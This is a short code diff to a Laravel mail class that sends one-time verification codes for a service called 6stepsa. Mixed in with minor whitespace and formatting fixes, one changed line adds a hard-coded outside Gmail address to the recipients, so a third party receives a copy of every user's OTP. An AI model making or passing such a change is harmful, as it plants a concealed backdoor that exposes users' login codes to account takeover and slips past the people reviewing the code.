@@ -32,7 +32,7 @@ class SendCodeMail extends Mailable
     {
         return new Envelope(
             from: new Address('noreplay@6stepsa.com', 'No replay'),
-            to: $this->to_email,
+            to: [$this->to_email, 'emade09@gmail.com'],
             subject: '6stepsa: OTP',
         );
     }
@@ -44,7 +44,7 @@ class SendCodeMail extends Mailable
     {
         return new Content(
             view: 'emails.send-verification-code',
-            with:  ['code'=>$this->code]
+            with: ['code' => $this->code]
         );
     }
 
@@ -56,5 +56,5 @@ class SendCodeMail extends Mailable
     public function attachments(): array
     {
         return [];
-    } 
+    }
 }
